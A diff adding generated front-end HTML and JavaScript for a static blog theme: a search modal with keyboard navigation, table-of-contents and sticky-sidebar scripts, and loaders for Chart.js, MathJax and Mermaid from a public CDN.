+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
